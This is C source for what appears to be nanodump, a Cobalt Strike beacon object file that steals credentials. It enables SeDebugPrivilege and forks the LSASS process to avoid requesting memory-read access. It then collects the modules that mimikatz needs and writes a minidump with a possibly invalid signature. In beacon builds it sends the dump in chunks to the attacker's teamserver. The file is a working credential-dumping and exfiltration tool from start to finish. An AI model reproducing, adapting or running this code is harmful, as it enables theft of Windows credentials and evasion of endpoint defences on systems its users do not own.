#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <time.h>

#include "../include/beacon.h"
#include "../include/nanodump.h"
#include "syscalls.c"


void writeat(
    struct dump_context* dc,
    ULONG32 rva,
    const void* data,
    unsigned size
)
{
    void* dst = (void*)((ULONG_PTR)dc->BaseAddress + rva);
    MSVCRT$memcpy(dst, data, size);
}

void append(
    struct dump_context* dc,
    const void* data,
    unsigned size
)
{
    if (dc->rva + size > DUMP_MAX_SIZE)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "The dump is too big, please increase DUMP_MAX_SIZE.\n"
        );
    }
    else
    {
        writeat(dc, dc->rva, data, size);
        dc->rva += size;
    }
}

BOOL write_file(
    char fileName[],
    char fileData[],
    ULONG32 fileLength
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = fileLength;
    wchar_t wcFilePath[MAX_PATH];
    wchar_t wcFileName[MAX_PATH];
    PUNICODE_STRING pUnicodeFilePath = (PUNICODE_STRING)intAlloc(sizeof(UNICODE_STRING));
    if (!pUnicodeFilePath)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
            (ULONG32)sizeof(UNICODE_STRING),
            KERNEL32$GetLastError()
        );
        return FALSE;
    }

    // create a UNICODE_STRING with the file path
    MSVCRT$mbstowcs(wcFileName, fileName, MAX_PATH);
    MSVCRT$wcscpy(wcFilePath, L"\\??\\");
    MSVCRT$wcsncat(wcFilePath, wcFileName, MAX_PATH);
    pUnicodeFilePath->Buffer = wcFilePath;
    pUnicodeFilePath->Length = MSVCRT$wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
    pUnicodeFilePath->Length *= 2;
    pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        pUnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // create the file
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    intFree(pUnicodeFilePath); pUnicodeFilePath = NULL;
    if (status == STATUS_OBJECT_PATH_NOT_FOUND)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "The path '%s' is invalid.\n",
            fileName
        );
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtCreateFile, status: 0x%lx\n",
            status
        );
        return FALSE;
    }
    // write the dump
    status = NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        fileData,
        fileLength,
        NULL,
        NULL
    );
    NtClose(hFile); hFile = NULL;
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtWriteFile, status: 0x%lx\n",
            status
        );
        return FALSE;
    }

    return TRUE;
}

#ifdef BOF
BOOL download_file(
    char fileName[],
    char fileData[],
    ULONG32 fileLength
)
{
    int fileNameLength = MSVCRT$strnlen(fileName, 256);

    // intializes the random number generator
    time_t t;
    MSVCRT$srand((unsigned) MSVCRT$time(&t));

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
    fileId |= (MSVCRT$rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    int messageLength = 8 + fileNameLength;
    char* packedData = (char*)intAlloc(messageLength);
    if (!packedData)
    {
        BeaconPrintf(CALLBACK_ERROR,
            "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
            messageLength,
            KERNEL32$GetLastError()
        );
        return FALSE;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(
        CALLBACK_FILE,
        packedData,
        messageLength
    );
    intFree(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + CHUNK_SIZE;
    char* packedChunk = (char*)intAlloc(chunkLength);
    if (!packedChunk)
    {
        BeaconPrintf(CALLBACK_ERROR,
            "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
            chunkLength,
            KERNEL32$GetLastError()
        );
        return FALSE;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength
        );
        exfiltrated += chunkLength;
    }
    intFree(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4
    );
    return TRUE;
}
#endif

BOOL enable_debug_priv(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    BOOL ok;

    LPCWSTR lpwPriv = L"SeDebugPrivilege";
    ok = ADVAPI32$LookupPrivilegeValueW(
        NULL,
        lpwPriv,
        &tkp.Privileges[0].Luid
    );
    if (!ok)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call LookupPrivilegeValueW, error: %ld\n",
            KERNEL32$GetLastError()
        );
        return FALSE;
    }

    NTSTATUS status = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
        &hToken
    );
    if(!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtOpenProcessToken, status: 0x%lx\n",
            status
        );
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    status = NtAdjustPrivilegesToken(
        hToken,
        FALSE,
        &tkp,
        sizeof(TOKEN_PRIVILEGES),
        NULL,
        NULL
    );
    NtClose(hToken);
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtAdjustPrivilegesToken, status: 0x%lx\n",
            status
        );
        return FALSE;
    }

    return TRUE;
}

HANDLE fork_lsass_process(
    DWORD dwPid
)
{
    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(
        &ObjectAttributes,
        NULL,
        0,
        NULL,
        NULL
    );
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    // no PROCESS_VM_READ :)
    DWORD dwFlags = PROCESS_CREATE_PROCESS;

    status = NtOpenProcess(
        &hProcess,
        dwFlags,
        &ObjectAttributes,
        &uPid
    );

    if (status == STATUS_INVALID_CID)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "There is no process with the PID %ld.\n",
            dwPid
        );
        return NULL;
    }
    if (status == STATUS_ACCESS_DENIED)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Could not open a handle to %ld\n",
            dwPid
        );
        return NULL;
    }
    else if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtOpenProcess, status: 0x%lx\n",
            status
        );
        return NULL;
    }

    // fork the LSASS process
    HANDLE hCloneProcess = NULL;
    OBJECT_ATTRIBUTES CloneObjectAttributes;

    InitializeObjectAttributes(
        &CloneObjectAttributes,
        NULL,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    status = NtCreateProcess(
        &hCloneProcess,
        GENERIC_ALL,
        &CloneObjectAttributes,
        hProcess,
        TRUE,
        NULL,
        NULL,
        NULL
    );

    NtClose(hProcess); hProcess = NULL;
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtCreateProcess, status: 0x%lx\n",
            status
        );
        return NULL;
    }

    return hCloneProcess;
}

HANDLE get_process_handle(
    DWORD dwPid,
    DWORD dwFlags,
    BOOL quiet
)
{
    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(
        &ObjectAttributes,
        NULL,
        0,
        NULL,
        NULL
    );
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    status = NtOpenProcess(
        &hProcess,
        dwFlags,
        &ObjectAttributes,
        &uPid
    );

    if (status == STATUS_INVALID_CID)
    {
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "There is no process with the PID %ld.\n",
                dwPid
            );
        }
        return NULL;
    }
    if (status == STATUS_ACCESS_DENIED)
    {
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Could not open a handle to %ld\n",
                dwPid
            );
        }
        return NULL;
    }
    else if (!NT_SUCCESS(status))
    {
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtOpenProcess, status: 0x%lx\n",
                status
            );
        }
        return NULL;
    }

    return hProcess;
}

ULONG32 convert_to_little_endian(
    ULONG32 number
)
{
    return  ((number & 0xff000000) >> 0x18) |
            ((number & 0x00ff0000) >> 0x08) |
            ((number & 0x0000ff00) << 0x08) |
            ((number & 0x000000ff) << 0x18);
}

void write_header(
    struct dump_context* dc
)
{
    struct MiniDumpHeader header;
    // the signature might or might not be valid
    header.Signature = convert_to_little_endian(
        *(ULONG32*)(dc->signature)
    );
    header.Version = 42899;
    header.ImplementationVersion = 0;
    header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
    header.StreamDirectoryRva = 32;
    header.CheckSum = 0;
    header.Reserved = 0;
    header.TimeDateStamp = 0;
    header.Flags = 0; // MiniDumpNormal

    char header_bytes[32];
    int offset = 0;
    MSVCRT$memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
    MSVCRT$memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
    MSVCRT$memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
    MSVCRT$memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
    MSVCRT$memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
    MSVCRT$memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
    MSVCRT$memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
    MSVCRT$memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
    MSVCRT$memcpy(header_bytes + offset, &header.Flags, 4);
    append(dc, header_bytes, 32);
}

void write_directory(
    struct dump_context* dc,
    struct MiniDumpDirectory directory
)
{
    byte directory_bytes[12];
    int offset = 0;
    MSVCRT$memcpy(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
    MSVCRT$memcpy(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
    MSVCRT$memcpy(directory_bytes + offset, &directory.Rva, 4);
    append(dc, directory_bytes, sizeof(directory_bytes));
}

void write_directories(
    struct dump_context* dc
)
{
    struct MiniDumpDirectory system_info_directory;
    system_info_directory.StreamType = 7; // SystemInfoStream
    system_info_directory.DataSize = 0; // this is calculated and written later
    system_info_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, system_info_directory);

    struct MiniDumpDirectory module_list_directory;
    module_list_directory.StreamType = 4; // ModuleListStream
    module_list_directory.DataSize = 0; // this is calculated and written later
    module_list_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, module_list_directory);

    struct MiniDumpDirectory memory64_list_directory;
    memory64_list_directory.StreamType = 9; // Memory64ListStream
    memory64_list_directory.DataSize = 0; // this is calculated and written later
    memory64_list_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, memory64_list_directory);
}

BOOL write_system_info_stream(
    struct dump_context* dc
)
{
    struct MiniDumpSystemInfo system_info;

    // read the version and build numbers from the PEB
    void* pPeb;
    ULONG32* OSMajorVersion;
    ULONG32* OSMinorVersion;
    USHORT* OSBuildNumber;
    ULONG32* OSPlatformId;
    UNICODE_STRING* CSDVersion;
    pPeb = (void*)READ_MEMLOC(PEB_OFFSET);

#if _WIN64
    OSMajorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x118);
    OSMinorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x11c);
    OSBuildNumber = (USHORT*)(((ULONG64)(pPeb)) + 0x120);
    OSPlatformId = (ULONG32*)(((ULONG64)(pPeb)) + 0x124);
    CSDVersion = (UNICODE_STRING*)(((ULONG64)(pPeb)) + 0x2e8);
    system_info.ProcessorArchitecture = 9; // AMD64
#else
    OSMajorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa4);
    OSMinorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa8);
    OSBuildNumber = (USHORT*)(((ULONG32)(pPeb)) + 0xac);
    OSPlatformId = (ULONG32*)(((ULONG32)(pPeb)) + 0xb0);
    CSDVersion = (UNICODE_STRING*)(((ULONG32)(pPeb)) + 0x1f0);
    system_info.ProcessorArchitecture = 0; // INTEL
#endif

    system_info.ProcessorLevel = 0;
    system_info.ProcessorRevision = 0;
    system_info.NumberOfProcessors = 0;
    // NTDLL$RtlGetVersion -> wProductType
    system_info.ProductType = VER_NT_WORKSTATION;
    //system_info.ProductType = VER_NT_DOMAIN_CONTROLLER;
    //system_info.ProductType = VER_NT_SERVER;
    system_info.MajorVersion = *OSMajorVersion;
    system_info.MinorVersion = *OSMinorVersion;
    system_info.BuildNumber = *OSBuildNumber;
    system_info.PlatformId = *OSPlatformId;
    system_info.CSDVersionRva = 0; // this is calculated and written later
    system_info.SuiteMask = 0;
    system_info.Reserved2 = 0;
#if _WIN64
    system_info.ProcessorFeatures1 = 0;
    system_info.ProcessorFeatures2 = 0;
#else
    system_info.VendorId1 = 0;
    system_info.VendorId2 = 0;
    system_info.VendorId3 = 0;
    system_info.VersionInformation = 0;
    system_info.FeatureInformation = 0;
    system_info.AMDExtendedCpuFeatures = 0;
#endif

#if _WIN64
    ULONG32 stream_size = 48;
    char system_info_bytes[48];
#else
    ULONG32 stream_size = 56;
    char system_info_bytes[56];
#endif

    int offset = 0;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
#if _WIN64
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8); offset += 8;
#else
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
    MSVCRT$memcpy(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4); offset += 4;
#endif

    ULONG32 stream_rva = dc->rva;
    append(dc, system_info_bytes, stream_size);

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 4, &stream_size, 4); // header + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 4 + 4, &stream_rva, 4); // header + streamType + Location.DataSize

    // write the service pack
    ULONG32 sp_rva = dc->rva;
    ULONG32 Length = CSDVersion->Length;
    // write the length
    append(dc, &Length, 4);
    // write the service pack name
    append(dc, CSDVersion->Buffer, CSDVersion->Length);
    // write the service pack RVA in the SystemInfoStream
    writeat(dc, stream_rva + 24, &sp_rva, 4); // addrof CSDVersionRva

    return TRUE;
}

PVOID get_peb_address(
    HANDLE hProcess
)
{
    PROCESS_BASIC_INFORMATION basic_info;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
            status
        );
        return 0;
    }

    return basic_info.PebBaseAddress;
}

struct module_info* find_modules(
    HANDLE hProcess,
    wchar_t* important_modules[],
    int number_of_important_modules,
    BOOL is_lsass
)
{
    // module list
    struct module_info* module_list = NULL;
    BOOL lsasrv_found = FALSE;
    SHORT pointer_size;
    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address, first_ldr_entry_address;

    peb_address = get_peb_address(hProcess);
    if (!peb_address)
        return NULL;

#if _WIN64
    pointer_size = 8;
    ldr_pointer = peb_address + 0x18;
#else
    pointer_size = 4;
    ldr_pointer = peb_address + 0xc;
#endif

    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_pointer,
        &ldr_address,
        pointer_size,
        NULL
    );
    if (status == STATUS_PARTIAL_COPY && !is_lsass)
    {
        // failed to read the memory of some process, simply continue
        return NULL;
    }
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
        return NULL;
    }

#if _WIN64
    module_list_pointer = ldr_address + 0x20;
#else
    module_list_pointer = ldr_address + 0x14;
#endif

    status = NtReadVirtualMemory(
        hProcess,
        (PVOID)module_list_pointer,
        &ldr_entry_address,
        pointer_size,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
        return NULL;
    }

    first_ldr_entry_address = ldr_entry_address;
    SHORT dlls_found = 0;
    struct LDR_DATA_TABLE_ENTRY ldr_entry;

    while (dlls_found < number_of_important_modules)
    {
        // read the entry
        status = NtReadVirtualMemory(
            hProcess,
            ldr_entry_address,
            &ldr_entry,
            sizeof(struct LDR_DATA_TABLE_ENTRY),
            NULL
        );
        if (!NT_SUCCESS(status))
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
                status
            );
            return NULL;
        }

        BOOL has_read_name = FALSE;
        wchar_t base_dll_name[256];
        // check if this dll is one of the dlls we are looking for
        for (int i = 0; i < number_of_important_modules; i++)
        {
            SHORT length = MSVCRT$wcsnlen(important_modules[i], 0xFF);

            // if the length of the name doesn't match, continue
            if (length * 2 != ldr_entry.BaseDllName.Length)
                continue;

            if (!has_read_name)
            {
                // initialize base_dll_name with all null-bytes
                MSVCRT$memset(base_dll_name, 0, sizeof(base_dll_name));
                // read the dll name
                status = NtReadVirtualMemory(
                    hProcess,
                    (PVOID)ldr_entry.BaseDllName.Buffer,
                    base_dll_name,
                    ldr_entry.BaseDllName.Length,
                    NULL
                );
                if (!NT_SUCCESS(status))
                {
#ifdef BOF
                    BeaconPrintf(CALLBACK_ERROR,
#else
                    printf(
#endif
                        "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
                        status
                    );
                    return NULL;
                }
                has_read_name = TRUE;
            }

            // compare the DLL's name, case insensitive
            if (!MSVCRT$_wcsicmp(important_modules[i], base_dll_name))
            {
                // check if the DLL is 'lsasrv.dll' so that we know the process is LSASS
                if (!MSVCRT$_wcsicmp(important_modules[i], L"lsasrv.dll"))
                    lsasrv_found = TRUE;

                struct module_info* new_module = (struct module_info*)intAlloc(sizeof(struct module_info));
                if (!new_module)
                {
#ifdef BOF
                    BeaconPrintf(CALLBACK_ERROR,
#else
                    printf(
#endif
                        "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
                        (ULONG32)sizeof(struct module_info),
                        KERNEL32$GetLastError());
                    return NULL;
                }
                new_module->next = NULL;
                new_module->dll_base = (PVOID)ldr_entry.DllBase;
                new_module->size_of_image = ldr_entry.SizeOfImage;

                // read the full path of the DLL
                status = NtReadVirtualMemory(
                    hProcess,
                    (PVOID)ldr_entry.FullDllName.Buffer,
                    new_module->dll_name,
                    ldr_entry.FullDllName.Length,
                    NULL
                );
                if (!NT_SUCCESS(status))
                {
#ifdef BOF
                    BeaconPrintf(CALLBACK_ERROR,
#else
                    printf(
#endif
                        "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
                        status
                    );
                    return NULL;
                }
                if (!module_list)
                {
                    module_list = new_module;
                }
                else
                {
                    struct module_info* last_module = module_list;
                    while (last_module->next)
                        last_module = last_module->next;
                    last_module->next = new_module;
                }
                dlls_found++;
            }
        }

        // next entry
        ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;
        // if we are back at the beginning, return
        if (ldr_entry_address == first_ldr_entry_address)
            break;
    }
    if (is_lsass && !lsasrv_found)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "This selected process is not LSASS.\n"
        );
        return NULL;
    }
    return module_list;
}

struct module_info* write_module_list_stream(
    struct dump_context* dc
)
{
    // list of modules relevant to mimikatz
    wchar_t* important_modules[] = {
        L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll",
        L"livessp.dll", L"dpapisrv.dll", L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll",
        L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll", L"eventlog.dll",
        L"wevtsvc.dll", L"termsrv.dll", L"cloudap.dll"
    };
    struct module_info* module_list = find_modules(
        dc->hProcess,
        important_modules,
        ARRAY_SIZE(important_modules),
        TRUE
    );
    if (module_list == NULL)
        return NULL;

    // write the full path of each dll
    struct module_info* curr_module = module_list;
    ULONG32 number_of_modules = 0;
    while(curr_module)
    {
        number_of_modules++;
        curr_module->name_rva = dc->rva;
        ULONG32 full_name_length = MSVCRT$wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
        full_name_length++; // account for the null byte at the end
        full_name_length *= 2;
        // write the length of the name
        append(dc, &full_name_length, 4);
        // write the path
        append(dc, curr_module->dll_name, full_name_length);
        curr_module = curr_module->next;
    }

    ULONG32 stream_rva = dc->rva;
    // write the number of modules
    append(dc, &number_of_modules, 4);
    byte module_bytes[108];
    curr_module = module_list;
    while (curr_module)
    {
        struct MiniDumpModule module;
        module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
        module.SizeOfImage = curr_module->size_of_image;
        module.CheckSum = 0;
        module.TimeDateStamp = 0;
        module.ModuleNameRva = curr_module->name_rva;
        module.VersionInfo.dwSignature = 0;
        module.VersionInfo.dwStrucVersion = 0;
        module.VersionInfo.dwFileVersionMS = 0;
        module.VersionInfo.dwFileVersionLS = 0;
        module.VersionInfo.dwProductVersionMS = 0;
        module.VersionInfo.dwProductVersionLS = 0;
        module.VersionInfo.dwFileFlagsMask = 0;
        module.VersionInfo.dwFileFlags = 0;
        module.VersionInfo.dwFileOS = 0;
        module.VersionInfo.dwFileType = 0;
        module.VersionInfo.dwFileSubtype = 0;
        module.VersionInfo.dwFileDateMS = 0;
        module.VersionInfo.dwFileDateLS = 0;
        module.CvRecord.DataSize = 0;
        module.CvRecord.rva = 0;
        module.MiscRecord.DataSize = 0;
        module.MiscRecord.rva = 0;
        module.Reserved0 = 0;
        module.Reserved0 = 0;

        int offset = 0;
        MSVCRT$memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
        MSVCRT$memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
        MSVCRT$memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
        MSVCRT$memcpy(module_bytes + offset, &module.Reserved1, 8);

        append(dc, module_bytes, sizeof(module_bytes));
        curr_module = curr_module->next;
    }

    // write our length in the MiniDumpSystemInfo directory
    ULONG32 stream_size = 4 + number_of_modules * sizeof(module_bytes);
    writeat(dc, 32 + 12 + 4, &stream_size, 4); // header + 1 directory + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 + 4 + 4, &stream_rva, 4); // header + 1 directory + streamType + Location.DataSize

    return module_list;
}

void free_linked_list(
    void* head
)
{
    if (head == NULL)
        return;

    ULONG32 number_of_nodes = 1;
    struct linked_list* node = (struct linked_list*)head;
    while(node->next)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        struct linked_list* node = (struct linked_list*)head;

        int jumps = i;
        while(jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}
